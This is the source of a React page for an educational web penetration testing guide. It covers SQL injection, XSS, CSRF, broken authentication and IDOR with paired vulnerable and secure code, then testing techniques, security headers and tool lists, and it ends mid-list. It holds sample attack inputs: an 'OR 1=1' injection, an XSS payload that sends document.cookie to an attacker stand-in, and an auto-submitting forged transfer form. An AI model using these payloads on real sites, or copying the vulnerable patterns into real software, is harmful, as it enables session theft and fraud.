
import React, { useState } from 'react';
import NavBar from '@/components/NavBar';
import { Shield, ShieldAlert, Code, Bug, Database, Lock, KeyRound, File, FileSearch, ShieldX } from 'lucide-react';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { cn } from '@/lib/utils';

const WebPenetrationTesting: React.FC = () => {
  const [activeSection, setActiveSection] = useState('core-concepts');

  const sections = [
    { id: 'core-concepts', title: 'Core Concepts', icon: <Shield className="h-6 w-6" /> },
    { id: 'common-attacks', title: 'Common Attacks', icon: <ShieldAlert className="h-6 w-6" /> },
    { id: 'testing-techniques', title: 'Testing Techniques', icon: <FileSearch className="h-6 w-6" /> },
    { id: 'mitigation-strategies', title: 'Mitigation Strategies', icon: <ShieldX className="h-6 w-6" /> },
    { id: 'tools-cheatsheets', title: 'Tools & Cheat Sheets', icon: <KeyRound className="h-6 w-6" /> },
    { id: 'interview-questions', title: 'Interview Questions', icon: <File className="h-6 w-6" /> },
  ];

  // Common attacks subsections
  const attackTypes = [
    { id: 'sql-injection', title: 'SQL Injection', icon: <Database className="h-5 w-5" /> },
    { id: 'xss', title: 'Cross-Site Scripting', icon: <Code className="h-5 w-5" /> },
    { id: 'csrf', title: 'Cross-Site Request Forgery', icon: <ShieldAlert className="h-5 w-5" /> },
    { id: 'auth', title: 'Broken Authentication', icon: <Lock className="h-5 w-5" /> },
    { id: 'access', title: 'Broken Access Control', icon: <KeyRound className="h-5 w-5" /> },
    { id: 'xxe', title: 'XML External Entity', icon: <File className="h-5 w-5" /> },
    { id: 'deserial', title: 'Insecure Deserialization', icon: <Bug className="h-5 w-5" /> },
    { id: 'cmd-injection', title: 'Command Injection', icon: <Code className="h-5 w-5" /> },
    { id: 'misconfig', title: 'Security Misconfigurations', icon: <ShieldX className="h-5 w-5" /> },
    { id: 'file-traversal', title: 'File Inclusion/Path Traversal', icon: <File className="h-5 w-5" /> },
    { id: 'ssrf', title: 'Server-Side Request Forgery', icon: <ShieldAlert className="h-5 w-5" /> },
    { id: 'http-smuggling', title: 'HTTP Request Smuggling', icon: <Bug className="h-5 w-5" /> },
    { id: 'jwt', title: 'JWT Attacks', icon: <KeyRound className="h-5 w-5" /> },
    { id: 'api', title: 'API Vulnerabilities', icon: <Code className="h-5 w-5" /> },
    { id: 'race', title: 'Race Conditions', icon: <Bug className="h-5 w-5" /> },
    { id: 'cors', title: 'CORS Misconfigurations', icon: <ShieldX className="h-5 w-5" /> },
    { id: 'websocket', title: 'WebSocket Vulnerabilities', icon: <Bug className="h-5 w-5" /> },
    { id: 'prototype', title: 'Prototype Pollution', icon: <Code className="h-5 w-5" /> },
    { id: 'graphql', title: 'GraphQL Vulnerabilities', icon: <Database className="h-5 w-5" /> },
    { id: 'oauth', title: 'OAuth Vulnerabilities', icon: <Lock className="h-5 w-5" /> },
    { id: 'cache', title: 'Web Cache Poisoning', icon: <Bug className="h-5 w-5" /> },
    { id: 'csp', title: 'CSP Bypass', icon: <ShieldX className="h-5 w-5" /> },
    { id: 'other-injection', title: 'Other Injection Flaws', icon: <Code className="h-5 w-5" /> },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-cybr-background text-cybr-foreground">
      <NavBar />
      
      <main className="flex-1">
        <div className="container mx-auto px-4 py-8">
          <header className="mb-12 text-center">
            <h1 className="text-4xl md:text-5xl font-bold mb-4 text-cybr-primary">
              Web Penetration Testing
            </h1>
            <p className="text-xl opacity-80 max-w-3xl mx-auto">
              A comprehensive guide to web application security testing techniques, common vulnerabilities, 
              and mitigation strategies for securing web applications.
            </p>
          </header>

          {/* Main Navigation Tabs */}
          <div className="mb-10">
            <Tabs 
              defaultValue={activeSection} 
              onValueChange={setActiveSection} 
              className="w-full"
            >
              <TabsList className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 w-full bg-cybr-muted/30 p-1">
                {sections.map(section => (
                  <TabsTrigger 
                    key={section.id}
                    value={section.id}
                    className="flex items-center gap-2"
                  >
                    {section.icon}
                    <span className="hidden sm:inline">{section.title}</span>
                  </TabsTrigger>
                ))}
              </TabsList>

              {/* Core Concepts Section */}
              <TabsContent value="core-concepts" className="mt-6">
                <div className="space-y-10">
                  <div>
                    <h2 className="section-title">Core Web Penetration Testing Concepts</h2>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mt-8">
                      <Card>
                        <CardHeader>
                          <CardTitle>What is Web Penetration Testing?</CardTitle>
                        </CardHeader>
                        <CardContent>
                          <p className="mb-4">
                            Web penetration testing is a security assessment approach that evaluates web applications 
                            for vulnerabilities from an attacker's perspective. It involves systematically testing 
                            all aspects of a web application including its infrastructure, design, and implementation.
                          </p>
                          <p>
                            Unlike automated scanning, penetration testing requires actively exploiting discovered 
                            vulnerabilities to determine their real-world risk and impact. This process helps organizations 
                            identify and remediate security issues before they can be exploited by malicious actors.
                          </p>
                        </CardContent>
                      </Card>

                      <Card>
                        <CardHeader>
                          <CardTitle>The Penetration Testing Lifecycle</CardTitle>
                        </CardHeader>
                        <CardContent>
                          <ol className="list-decimal list-inside space-y-2">
                            <li><strong>Planning & Reconnaissance</strong> - Defining scope and gathering information</li>
                            <li><strong>Scanning</strong> - Analyzing the application for potential vulnerabilities</li>
                            <li><strong>Exploitation</strong> - Attempting to exploit discovered vulnerabilities</li>
                            <li><strong>Post-Exploitation</strong> - Determining attack impact and potential pivots</li>
                            <li><strong>Reporting</strong> - Documenting findings and providing remediation steps</li>
                          </ol>
                        </CardContent>
                      </Card>

                      <Card className="md:col-span-2">
                        <CardHeader>
                          <CardTitle>The OWASP Top 10</CardTitle>
                          <CardDescription>
                            The industry standard awareness document for web application security
                          </CardDescription>
                        </CardHeader>
                        <CardContent>
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
                            {[
                              { label: "A01:2021", title: "Broken Access Control" },
                              { label: "A02:2021", title: "Cryptographic Failures" },
                              { label: "A03:2021", title: "Injection" },
                              { label: "A04:2021", title: "Insecure Design" },
                              { label: "A05:2021", title: "Security Misconfiguration" },
                              { label: "A06:2021", title: "Vulnerable & Outdated Components" },
                              { label: "A07:2021", title: "Identification & Authentication Failures" },
                              { label: "A08:2021", title: "Software & Data Integrity Failures" },
                              { label: "A09:2021", title: "Security Logging & Monitoring Failures" },
                              { label: "A10:2021", title: "Server-Side Request Forgery" },
                            ].map((item, index) => (
                              <div 
                                key={index} 
                                className="p-4 border border-cybr-primary/20 rounded-lg bg-cybr-muted/30 hover:bg-cybr-muted/50 transition-all"
                              >
                                <div className="font-mono text-xs text-cybr-primary mb-2">{item.label}</div>
                                <div className="font-medium">{item.title}</div>
                              </div>
                            ))}
                          </div>
                        </CardContent>
                      </Card>
                    </div>
                  </div>

                  <div>
                    <h3 className="text-2xl font-bold mb-4">Key Testing Methodologies</h3>
                    
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                      <SecurityCard
                        title="Black Box Testing"
                        description="Simulates an external attack with no prior knowledge of the system. The tester has no access to internal systems and must discover vulnerabilities from the outside."
                        icon={<Shield className="h-6 w-6" />}
                      />
                      <SecurityCard
                        title="White Box Testing"
                        description="The tester has complete knowledge of the system, including source code, architecture diagrams, and documentation. Focuses on finding vulnerabilities with complete information."
                        icon={<Shield className="h-6 w-6" />}
                      />
                      <SecurityCard
                        title="Gray Box Testing"
                        description="A hybrid approach where testers have partial knowledge of the system. This simulates attacks from users with limited privileges or knowledge."
                        icon={<Shield className="h-6 w-6" />}
                      />
                    </div>
                  </div>
                </div>
              </TabsContent>

              {/* Common Attacks Section */}
              <TabsContent value="common-attacks" className="mt-6">
                <h2 className="section-title">Common Web Attacks</h2>
                
                <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mt-8">
                  {/* Left sidebar with attack types */}
                  <div className="md:col-span-1 bg-cybr-muted/20 rounded-lg p-4 self-start sticky top-20">
                    <h3 className="text-lg font-semibold mb-4 text-cybr-primary">Attack Types</h3>
                    <ul className="space-y-1">
                      {attackTypes.map(attack => (
                        <li key={attack.id}>
                          <a 
                            href={`#${attack.id}`}
                            className="flex items-center gap-2 p-2 rounded-md hover:bg-cybr-muted/30 transition-colors"
                            onClick={(e) => {
                              e.preventDefault();
                              document.getElementById(attack.id)?.scrollIntoView({ behavior: 'smooth' });
                            }}
                          >
                            {attack.icon}
                            <span>{attack.title}</span>
                          </a>
                        </li>
                      ))}
                    </ul>
                  </div>
                  
                  {/* Right content area */}
                  <div className="md:col-span-3 space-y-16">
                    {/* SQL Injection */}
                    <section id="sql-injection" className="scroll-mt-20">
                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">SQL Injection</h3>
                      <p className="mb-6">
                        SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query,
                        tricking the interpreter into executing unintended commands or accessing unauthorized data.
                      </p>
                      
                      <h4 className="text-xl font-semibold mt-6 mb-3">Example Attack</h4>
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={true}
                        title="Vulnerable SQL Query" 
                        code={`// Server-side code
const userId = req.params.id;
const query = "SELECT * FROM users WHERE id = " + userId;
db.execute(query);

// Attacker input: 1 OR 1=1
// Resulting query: SELECT * FROM users WHERE id = 1 OR 1=1
// This returns all users in the database`} 
                      />
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={false}
                        title="Secure Implementation" 
                        code={`// Server-side code
const userId = req.params.id;
const query = "SELECT * FROM users WHERE id = ?";
db.execute(query, [userId]);

// Parameterized queries prevent SQL injection by separating code from data`} 
                      />
                      
                      <h4 className="text-xl font-semibold mt-6 mb-3">Testing for SQL Injection</h4>
                      <ul className="list-disc pl-6 space-y-2">
                        <li>Input single quotes (') and observe errors</li>
                        <li>Test boolean conditions (OR 1=1, OR 1=2)</li>
                        <li>Try commenting out the rest of the query (--)</li>
                        <li>Use UNION attacks to extract data from other tables</li>
                        <li>Test blind SQL injection techniques when no output is visible</li>
                      </ul>
                    </section>
                    
                    {/* Cross-Site Scripting (XSS) */}
                    <section id="xss" className="scroll-mt-20">
                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Cross-Site Scripting (XSS)</h3>
                      <p className="mb-6">
                        XSS attacks occur when an application includes untrusted data in a new web page without proper validation or escaping,
                        allowing attackers to execute scripts in the victim's browser. This can lead to session hijacking, credential theft,
                        and defacement.
                      </p>
                      
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
                        <SecurityCard
                          title="Reflected XSS"
                          description="Non-persistent attack where malicious script is reflected off a web server, such as in search results or error messages."
                          severity="medium"
                        />
                        <SecurityCard
                          title="Stored XSS"
                          description="Malicious script is stored on the target server (e.g., in a database) and later retrieved by victims when they access the affected content."
                          severity="high"
                        />
                        <SecurityCard
                          title="DOM-based XSS"
                          description="Vulnerability exists in client-side code rather than server-side code, where JavaScript modifies the DOM in an unsafe way."
                          severity="medium"
                        />
                      </div>
                      
                      <h4 className="text-xl font-semibold mt-6 mb-3">Example Attack</h4>
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={true}
                        title="Vulnerable Code" 
                        code={`// Directly inserting user input into HTML
document.getElementById("output").innerHTML = 
  "Search results for: " + userInput;

// Attacker input: <script>sendCookiesToAttacker(document.cookie)</script>
// This executes the script in the victim's browser`} 
                      />
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={false}
                        title="Secure Implementation" 
                        code={`// Using safe methods to add text content
document.getElementById("output").textContent = 
  "Search results for: " + userInput;

// Or properly escaping HTML on the server side
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};`} 
                      />
                    </section>

                    {/* Cross-Site Request Forgery (CSRF) */}
                    <section id="csrf" className="scroll-mt-20">
                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Cross-Site Request Forgery (CSRF)</h3>
                      <p className="mb-6">
                        CSRF attacks trick authenticated users into executing unwanted actions on a web application where they're currently authenticated.
                        This exploits the trust a website has in a user's browser, making the victim perform state-changing requests like fund transfers
                        or password changes without their knowledge.
                      </p>
                      
                      <h4 className="text-xl font-semibold mt-6 mb-3">Example Attack</h4>
                      <CodeExample 
                        language="html" 
                        isVulnerable={true}
                        title="Malicious Website Code" 
                        code={`<!-- Attacker's website contains this hidden form -->
<form action="https://bank.example/transfer" method="POST" id="exploit-form">
  <input type="hidden" name="recipient" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  document.getElementById("exploit-form").submit();
</script>

<!-- When victim visits the attacker's site while logged into their bank,
     this form automatically submits, sending money to the attacker -->`} 
                      />
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={false}
                        title="CSRF Protection Implementation" 
                        code={`// Server-side code (Express.js example)
const express = require('express');
const csrf = require('csurf');
const app = express();

// Setup CSRF protection
const csrfProtection = csrf({ cookie: true });
app.use(csrfProtection);

app.get('/transfer-form', (req, res) => {
  // Include CSRF token in form
  res.render('transfer', { csrfToken: req.csrfToken() });
});

app.post('/transfer', (req, res) => {
  // The csurf middleware will automatically validate the token
  // and reject the request if invalid
  
  // Process the transfer if token is valid
  processTransfer(req.body);
  res.send('Transfer complete');
});`} 
                      />
                      
                      <CodeExample 
                        language="html" 
                        isVulnerable={false}
                        title="Protected Form" 
                        code={`<!-- Form with CSRF token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input type="text" name="recipient" placeholder="Recipient">
  <input type="number" name="amount" placeholder="Amount">
  <button type="submit">Transfer</button>
</form>`} 
                      />
                    </section>
                    
                    {/* Additional attack sections would follow here */}
                    <section id="auth" className="scroll-mt-20">
                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Broken Authentication</h3>
                      <p className="mb-6">
                        Broken Authentication refers to implementation flaws in authentication and session management that allow attackers
                        to compromise passwords, keys, session tokens, or exploit other vulnerabilities to assume users' identities.
                      </p>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                        <SecurityCard
                          title="Credential Stuffing"
                          description="Automated injection of breached username/password pairs to gain unauthorized access to user accounts."
                          severity="high"
                        />
                        <SecurityCard
                          title="Brute Force Attacks"
                          description="Attempting to guess passwords through exhaustive trial-and-error methods to gain access to accounts."
                          severity="high"
                        />
                      </div>
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={true}
                        title="Vulnerable Authentication" 
                        code={`// No rate limiting or account lockout
async function loginUser(email, password) {
  const user = await db.users.findOne({ email });
  
  if (user && user.password === md5(password)) {
    // Weak password hashing (MD5)
    // Create session without proper expiry
    return generateToken(user);
  }
  return null;
}`} 
                      />
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={false}
                        title="Secure Authentication" 
                        code={`// Secure authentication with rate limiting and strong hashing
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');

// Apply rate limiting middleware
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts, please try again later'
});

async function loginUser(email, password) {
  const user = await db.users.findOne({ email });
  
  if (user) {
    // Compare with securely hashed password
    const match = await bcrypt.compare(password, user.passwordHash);
    if (match) {
      // Create session with proper expiry and rotation
      return {
        token: generateSecureToken(user),
        expiresAt: new Date(Date.now() + 3600000) // 1 hour
      };
    }
  }
  
  // Use constant-time comparison to prevent timing attacks
  await bcrypt.compare(password, '$2b$10$validHashForTimingAttackPrevention');
  return null;
}`} 
                      />
                    </section>

                    {/* Additional attack types would be added here similarly */}
                    <section id="access" className="scroll-mt-20">
                      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Broken Access Control</h3>
                      <p className="mb-6">
                        Broken Access Control occurs when restrictions on what authenticated users are allowed to do are not 
                        properly enforced. Attackers can exploit these flaws to access unauthorized functionality or data.
                      </p>
                      
                      <h4 className="text-xl font-semibold mt-6 mb-3">Common Issues</h4>
                      <ul className="list-disc pl-6 space-y-2 mb-6">
                        <li>Insecure Direct Object References (IDOR)</li>
                        <li>Vertical privilege escalation (accessing features requiring higher privileges)</li>
                        <li>Horizontal privilege escalation (accessing data of other users at same privilege level)</li>
                        <li>Missing access controls for API endpoints</li>
                        <li>Bypassing access control checks by modifying URLs or HTML</li>
                      </ul>
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={true}
                        title="IDOR Vulnerability" 
                        code={`// No authorization check on user data access
app.get('/api/users/:userId/profile', (req, res) => {
  const userId = req.params.userId;
  
  // Vulnerable: retrieves user data without checking if the 
  // current user has permission to access this profile
  db.getUserProfile(userId)
    .then(profile => res.json(profile))
    .catch(err => res.status(500).json({ error: err.message }));
});

// An attacker can simply change the userId parameter to access other users' data`} 
                      />
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={false}
                        title="Secure Access Control" 
                        code={`// Authorization middleware
function checkAccessPermission(req, res, next) {
  const requestedUserId = req.params.userId;
  const currentUserId = req.user.id;
  
  // Allow access only if:
  // 1. User is accessing their own data, or
  // 2. User has admin privileges
  if (requestedUserId === currentUserId || req.user.role === 'ADMIN') {
    next(); // Authorized
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
}

// Apply middleware to protected routes
app.get('/api/users/:userId/profile', checkAccessPermission, (req, res) => {
  const userId = req.params.userId;
  
  db.getUserProfile(userId)
    .then(profile => res.json(profile))
    .catch(err => res.status(500).json({ error: err.message }));
});`} 
                      />
                    </section>
                  </div>
                </div>
              </TabsContent>

              {/* Testing Techniques Section */}
              <TabsContent value="testing-techniques" className="mt-6">
                <h2 className="section-title">Web Penetration Testing Techniques</h2>
                
                <div className="space-y-10 mt-8">
                  <Card>
                    <CardHeader>
                      <CardTitle>Reconnaissance Techniques</CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div>
                        <h4 className="font-semibold text-lg mb-2">Passive Information Gathering</h4>
                        <ul className="list-disc pl-6 space-y-1">
                          <li>WHOIS and DNS records analysis</li>
                          <li>Search engine reconnaissance</li>
                          <li>Social media investigation</li>
                          <li>Public data breach analysis</li>
                          <li>Job posting analysis</li>
                        </ul>
                      </div>
                      
                      <div>
                        <h4 className="font-semibold text-lg mb-2">Active Information Gathering</h4>
                        <ul className="list-disc pl-6 space-y-1">
                          <li>Port scanning (Nmap)</li>
                          <li>Subdomain enumeration</li>
                          <li>Technology stack identification (Wappalyzer)</li>
                          <li>Directory and file brute-forcing</li>
                          <li>Parameter discovery</li>
                        </ul>
                      </div>
                    </CardContent>
                  </Card>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                    <Card>
                      <CardHeader>
                        <CardTitle>Manual Testing Approaches</CardTitle>
                      </CardHeader>
                      <CardContent>
                        <ul className="list-disc pl-6 space-y-2">
                          <li>
                            <strong>Content Discovery</strong> - Exploring application structure to find hidden or unlinked content
                          </li>
                          <li>
                            <strong>Parameter Manipulation</strong> - Testing how the application handles unexpected parameter values
                          </li>
                          <li>
                            <strong>Session Analysis</strong> - Examining how sessions are created, managed, and destroyed
                          </li>
                          <li>
                            <strong>Authentication Testing</strong> - Probing for weaknesses in login flows, password policies and resets
                          </li>
                          <li>
                            <strong>Authorization Testing</strong> - Checking access controls by attempting to access resources horizontally and vertically
                          </li>
                          <li>
                            <strong>Business Logic Testing</strong> - Identifying flaws in business processes that can be exploited
                          </li>
                        </ul>
                      </CardContent>
                    </Card>
                    
                    <Card>
                      <CardHeader>
                        <CardTitle>Automated Testing Tools</CardTitle>
                      </CardHeader>
                      <CardContent>
                        <ul className="list-disc pl-6 space-y-2">
                          <li>
                            <strong>Web Vulnerability Scanners</strong> - Automated tools like OWASP ZAP, Burp Suite, and Acunetix
                          </li>
                          <li>
                            <strong>Fuzzing</strong> - Using tools like Wfuzz or custom scripts to test input handling
                          </li>
                          <li>
                            <strong>Static Code Analysis</strong> - Using tools like SonarQube, Checkmarx, or Semgrep to analyze source code
                          </li>
                          <li>
                            <strong>Dynamic Analysis</strong> - Runtime testing with tools like OWASP ZAP or Burp Suite
                          </li>
                          <li>
                            <strong>API Testing</strong> - Using Postman, Insomnia, or custom scripts to test API endpoints
                          </li>
                        </ul>
                      </CardContent>
                    </Card>
                  </div>
                  
                  <Card>
                    <CardHeader>
                      <CardTitle>Proxy-Based Testing</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <p className="mb-4">
                        Proxy-based testing is a fundamental technique where testers route web traffic through an intercepting proxy
                        to observe, manipulate, and repeat requests. This provides visibility into all interactions between client and server.
                      </p>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
                        <div className="border border-cybr-muted p-4 rounded-lg">
                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Key Capabilities</h4>
                          <ul className="list-disc pl-6 space-y-1">
                            <li>Intercept and modify requests/responses</li>
                            <li>Analyze headers, cookies, and parameters</li>
                            <li>Test input validation by modifying values</li>
                            <li>Replay and automate requests</li>
                            <li>Test for client-side vulnerabilities</li>
                          </ul>
                        </div>
                        
                        <div className="border border-cybr-muted p-4 rounded-lg">
                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Popular Tools</h4>
                          <ul className="list-disc pl-6 space-y-1">
                            <li><strong>Burp Suite</strong> - Industry standard with extensive capabilities</li>
                            <li><strong>OWASP ZAP</strong> - Free open-source alternative with active scanning</li>
                            <li><strong>Fiddler</strong> - Web debugging proxy with strong .NET integration</li>
                            <li><strong>Mitmproxy</strong> - Command-line based intercepting proxy</li>
                          </ul>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>

              {/* Mitigation Strategies Section */}
              <TabsContent value="mitigation-strategies" className="mt-6">
                <h2 className="section-title">Web Security Mitigation Strategies</h2>
                
                <div className="space-y-10 mt-8">
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                    <SecurityCard
                      title="Input Validation"
                      description="Validate all input on the server side using whitelisting, not blacklisting. Apply context-specific validation for different data types."
                      icon={<Code className="h-6 w-6" />}
                      severity="high"
                    />
                    <SecurityCard
                      title="Output Encoding"
                      description="Encode output data based on the context where it will be displayed (HTML, JavaScript, CSS, URLs, etc.) to prevent injection attacks."
                      icon={<Code className="h-6 w-6" />}
                      severity="high"
                    />
                    <SecurityCard
                      title="Authentication Controls"
                      description="Implement MFA, strong password policies, secure credential storage, and protection against brute force attacks."
                      icon={<Lock className="h-6 w-6" />}
                      severity="high"
                    />
                  </div>
                  
                  <Card>
                    <CardHeader>
                      <CardTitle>Security Headers Implementation</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <p className="mb-4">
                        HTTP security headers provide an additional layer of security by helping to mitigate certain types of attacks.
                        Here are the key security headers that should be implemented:
                      </p>
                      
                      <CodeExample 
                        language="javascript" 
                        isVulnerable={false}
                        title="Implementing Security Headers (Express.js)" 
                        code={`// Express.js example using helmet middleware
const express = require('express');
const helmet = require('helmet');
const app = express();

// Apply helmet middleware (sets various security headers)
app.use(helmet());

// Custom CSP configuration
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "trusted-cdn.com"],
    styleSrc: ["'self'", "trusted-cdn.com"],
    imgSrc: ["'self'", "data:", "trusted-cdn.com"],
    connectSrc: ["'self'", "api.trusted-service.com"],
    fontSrc: ["'self'", "trusted-cdn.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: [],
  }
}));

// Set custom security headers
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  next();
});`} 
                      />
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-6">
                        <div className="border border-cybr-muted p-4 rounded-lg">
                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Critical Security Headers</h4>
                          <ul className="list-disc pl-6 space-y-1">
                            <li><code>Content-Security-Policy</code> - Controls allowed sources of content</li>
                            <li><code>X-XSS-Protection</code> - Enables browser's XSS filter</li>
                            <li><code>X-Frame-Options</code> - Prevents clickjacking attacks</li>
                            <li><code>X-Content-Type-Options</code> - Prevents MIME type sniffing</li>
                            <li><code>Strict-Transport-Security</code> - Forces HTTPS connections</li>
                          </ul>
                        </div>
                        
                        <div className="border border-cybr-muted p-4 rounded-lg">
                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Additional Security Headers</h4>
                          <ul className="list-disc pl-6 space-y-1">
                            <li><code>Referrer-Policy</code> - Controls information in the Referer header</li>
                            <li><code>Permissions-Policy</code> - Controls browser features/APIs</li>
                            <li><code>Cache-Control</code> - Prevents caching of sensitive data</li>
                            <li><code>Clear-Site-Data</code> - Clears browsing data</li>
                            <li><code>Cross-Origin-Embedder-Policy</code> - Resource isolation</li>
                            <li><code>Cross-Origin-Opener-Policy</code> - Window isolation</li>
                          </ul>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                  
                  <Card>
                    <CardHeader>
                      <CardTitle>Secure Development Practices</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                        <div>
                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Secure Coding Standards</h4>
                          <ul className="list-disc pl-6 space-y-2">
                            <li>Follow the principle of least privilege for all components</li>
                            <li>Implement proper error handling without revealing sensitive details</li>
                            <li>Use parameterized queries for all database operations</li>
                            <li>Apply defense in depth with multiple security layers</li>
                            <li>Maintain secure dependency management with regular updates</li>
                            <li>Follow language-specific secure coding guidelines</li>
                          </ul>
                        </div>
                        
                        <div>
                          <h4 className="text-lg font-semibold mb-2 text-cybr-primary">Security Testing Integration</h4>
                          <ul className="list-disc pl-6 space-y-2">
                            <li>Incorporate SAST tools in CI/CD pipelines</li>
                            <li>Implement regular DAST scanning</li>
                            <li>Conduct code reviews with security focus</li>
                            <li>Run periodic penetration tests</li>
                            <li>Use dependency scanners to detect vulnerable packages</li>
                            <li>Implement security regression testing</li>
                          </ul>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </div>
              </TabsContent>

              {/* Tools & Cheat Sheets Section */}
              <TabsContent value="tools-cheatsheets" className="mt-6">
                <h2 className="section-title">Web Penetration Testing Tools & Cheat Sheets</h2>
                
                <div className="space-y-10 mt-8">
                  <h3 className="text-2xl font-bold mb-4">Essential Penetration Testing Tools</h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    <Card className={cn("transition-all hover:shadow-lg hover:shadow-cybr-primary/10")}>
                      <CardHeader className="bg-cybr-muted/30 border-b border-cybr-muted">
                        <CardTitle>Burp Suite</CardTitle>
                        <CardDescription>Web vulnerability scanner & proxy</CardDescription>
                      </CardHeader>
                      <CardContent className="pt-4">
                        <p className="mb-4">A comprehensive platform for web application security testing. Available as both free and professional versions.</p>
                        <ul className="list-disc pl-6 space-y-1">
                          <li>Intercepting proxy</li>
                          <li>Scanner for automated detection</li>
                          <li>Intruder for fuzzing & brute-forcing</li>
                          <li>Repeater for request manipulation</li>
                          <li>Extensible with plugins</li>
                        </ul>
                      </CardContent>
                    </Card>
                    
                    <Card className={cn("transition-all hover:shadow-lg hover:shadow-cybr-primary/10")}>
                      <CardHeader className="bg-cybr-muted/30 border-b border-cybr-muted">
                        <CardTitle>OWASP ZAP</CardTitle>
                        <CardDescription>Free security testing suite</CardDescription>
                      </CardHeader>
                      <CardContent className="pt-4">
                        <p className="mb-4">A free, open-source penetration testing tool for finding vulnerabilities in web applications.</p>
                        <ul className="list-disc pl-6 space-y-1">
                          <li>Automated scanner</li>
                          <li>Intercepting proxy</li>
                          <li>Fuzzing capabilities</li>
                          <li>REST API for automation</li>
                          <li>Active community support</li>
                        </ul>
                      </CardContent>
                    </Card>
                    
                    <Card className={cn("transition-all hover:shadow-lg hover:shadow-cybr-primary/10")}>
                      <CardHeader className="bg-cybr-muted/30 border-b border-cybr-muted">
                        <CardTitle>Metasploit</CardTitle>
                        <CardDescription>Exploitation framework</CardDescription>
                      </CardHeader>
                      <CardContent className="pt-4">
                        <p className="mb-4">A comprehensive tool for developing, testing, and executing exploits.</p>
                        <ul className="list-disc pl-6 space-y-1">
                          <li>Exploit development framework</li>
                          <li>Large database of known vulnerabilities</li>
                          <li>Post-exploitation capabilities</li>
                          <li>Auxiliary scanning modules</li>
                          <li>Payload generation tools</li>
                        </ul>
                      </CardContent>
                    </Card>
                  </div>
                  
                  <h3 className="text-2xl font-bold mb-4 mt-8">Specialized Testing Tools</h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
                    {[
                      {
                        name: "Nmap",
                        description: "Network discovery and security auditing",
                        features: ["Port scanning", "OS detection", "Service version detection"]
                      },
                      {
                        name: "sqlmap",
                        description: "Automated SQL injection detection and exploitation",
                        features: ["Database fingerprinting", "Data extraction", "Access underlying file system"]
                      },
                      {
                        name: "Nikto",
                        description: "Web server scanner for dangerous files/CGIs",
                        features: ["Checks for outdated servers", "Default files detection", "Insecure configurations"]
                      },
                      {
                        name: "Dirb/Gobuster",
                        description: "Web content scanner",
                        features: ["Directory brute forcing", "Hidden file discovery", "Multiple wordlists"]
                      },
                      {
                        name: "Amass",
                        description: "Network mapping of attack surfaces & external asset discovery",
                        features: ["DNS enumeration", "Certificate transparency", "API integrations"]
                      },
                      {
                        name: "OWASP Amass",
                        description: "In-depth Attack Surface Mapping",
                        features: ["Subdomain enumeration", "Internet data collection", "Graph database"]
                      },
                      {
                        name: "Nuclei",
